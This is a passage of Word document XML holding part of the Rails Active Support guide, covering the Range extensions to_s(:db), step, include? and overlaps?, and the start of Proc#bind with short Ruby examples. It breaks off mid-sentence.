      </w:tr>
    </w:tbl>
    <w:p w14:paraId="162943FC" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Defined in </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>active_support/core_ext/regexp.rb</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4821D3CB" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="3"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">13 Extensions to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Range</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="54C6E3E4" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">13.1 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>to_s</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D21972A" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Active Support extends the method </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Range#to_s</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> so that it understands an optional format argument. As of this writing the only supported non-default format is </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:db</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5280"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="05CA5C27" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="3CB11155" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>(Date.today..Date.tomorrow).to_s</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6FF2B315" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t># =&gt; "2009-10-25..2009-10-26"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4CCD183A" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="73273C9D" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>(Date.today..Date.tomorrow).to_s(:db)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="434D412E" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t># =&gt; "BETWEEN '2009-10-25' AND '2009-10-26'"</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="3F3E00DC" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">As the example depicts, the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:db</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> format generates a </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>BETWEEN</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>SQL</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> clause. That is used by Active Record in its support for range values in conditions.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="48B3D6B5" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Defined in </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>active_support/core_ext/range/conversions.rb</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3640AEFA" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">13.2 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>step</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A8582C3" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Active Support extends the method </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Range#step</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> so that it can be invoked without a block:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4320"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="6BDF8A40" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="1EF659CB" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:divId w:val="430667825"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>(1..10).step(2) # =&gt; [1, 3, 5, 7, 9]</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="79C79A5B" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>As the example shows, in that case the method returns an array with the corresponding elements.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79797E7B" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Defined in </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>active_support/core_ext/range/blockless_step.rb</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="44F62467" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">13.3 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>include?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="31DF56AA" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The method </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Range#include?</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> says whether some value falls between the ends of a given instance:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4080"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="5C181950" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="600C8A07" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:divId w:val="285426334"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>(2..3).include?(Math::E) # =&gt; true</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="23900C0C" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>Active Support extends this method so that the argument may be another range in turn. In that case we test whether the ends of the argument range belong to the receiver themselves:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4200"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="4C371CB9" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="682AF71B" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>(1..10).include?(3..7)  # =&gt; true</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5356C357" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>(1..10).include?(0..7)  # =&gt; false</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4290B619" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>(1..10).include?(3..11) # =&gt; false</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="44A6C096" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>(1...9).include?(3..9)  # =&gt; false</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="7955C410" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The original </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Range#include?</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> is still the one aliased to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Range#===</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A4F985D" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Defined in </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>active_support/core_ext/range/include_range.rb</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A95200C" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">13.4 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>overlaps?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="15FB344B" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The method </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Range#overlaps?</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> says whether any two given ranges have non-void intersection:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4440"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="236E1226" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="6111E31B" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>(1..10).overlaps?(7..11)  # =&gt; true</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0642760D" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>(1..10).overlaps?(0..7)   # =&gt; true</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3EB79223" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>(1..10).overlaps?(11..27) # =&gt; false</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="50BAEF94" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Defined in </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>active_support/core_ext/range/overlaps.rb</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E85EE50" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="3"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">14 Extensions to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Proc</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="63143BF7" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">14.1 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>bind</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A4D68D2" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">As you surely know Ruby has an </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>UnboundMethod</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> class whose instances are methods that belong to the limbo of methods without a self. The method </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Module#instance_method</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> returns an unbound method for example:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="7680"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="6EAD6649" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="26BAFDF5" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:divId w:val="869605068"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Hash.instance_method(:delete) # =&gt; #&lt;UnboundMethod: Hash#delete&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="0D39E6E6" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">An unbound method is not callable as is, you need to bind it first to an object with </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>bind</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4320"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="5B4586A0" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="015BBA15" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>clear = Hash.instance_method(:clear)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="36FE77C5" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>clear.bind({:a</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; 1}).call # =&gt; {}</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="154A8710" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Active Support defines </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Proc#bind</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> with an analogous purpose:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4488"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="24451360" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="672C299B" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:divId w:val="1422798916"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Proc.new</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>{ size }.bind([]).call # =&gt; 0</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="09050B37" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">As you see that’s callable and bound to the argument, the return value is indeed a </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Method</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="218BFF72" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">To do so </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Proc#bind</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> actually creates a method under the hood. If you ever see a method with a weird name like </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>__bind_1256598120_237302</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> in a stack trace you know now where it comes from.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="12D37050" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Action Pack uses this trick in </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>rescue_from</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> for example, which accepts the name of a method and also a proc as callbacks for a given rescued exception. It has to call them in either case, so a bound method is returned by </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>handler_for_rescue</w:t>
      </w:r>
      <w:r>
